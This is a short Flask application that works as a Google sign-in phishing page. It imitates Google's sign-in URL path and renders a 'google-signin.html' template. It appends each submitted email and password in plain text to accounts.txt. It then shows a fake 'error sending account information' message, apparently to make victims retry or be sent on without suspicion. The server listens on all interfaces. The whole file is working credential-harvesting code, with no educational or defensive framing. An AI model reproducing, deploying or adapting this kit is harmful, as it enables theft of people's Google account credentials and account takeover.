from flask import Flask, render_template, flash, redirect, url_for
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Email

app = Flask(__name__)
app.config["SECRET_KEY"] = "YOUR_KEY_HERE"



class FormLogin(FlaskForm):
    email = StringField('Email ',
                        validators=[DataRequired(), Email()])
    password = PasswordField('Lösenord: ', validators=[DataRequired()])
    submit = SubmitField('Next')




@app.route("/")
def redirect_to_sigin():
    return redirect(url_for("signin"))


@app.route("/v3/signin/identifier?dsh=S-12zxc13564bchdgfdf35cvbc131230+9+0&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AQDadw1rfrs8f48ZsXVvZm-f1Remdn_zuhNoWwh1Q7e_iG2MTZ_xK462341fsdfsefGxHPeG_aL213413421pdf_QBz2khg", 
            methods=["GET", "POST"])
def signin():



	form = FormLogin()
	
	if form.validate_on_submit():

		with open("accounts.txt","a") as file:
			file.write(str(form.email.data) + ", " + str(form.password.data) + "\n")
        
		return redirect(url_for("flash_to_google"))


        
	return render_template("google-signin.html", title="Sign In", form=form, redirect=False)


@app.route("/reroute", methods=["GET", "POST"])
def flash_to_google():
    flash(f"An error accured when trying to send account information to server, reloading page!", "invalid")
    form = FormLogin()
    return render_template("google-signin.html", title="Sign In", form=form, redirect = True)



@app.route("/animation")
def animation():
	return render_template("animation.html")

if __name__ == "__main__":
   	app.run(debug=False, host="0.0.0.0")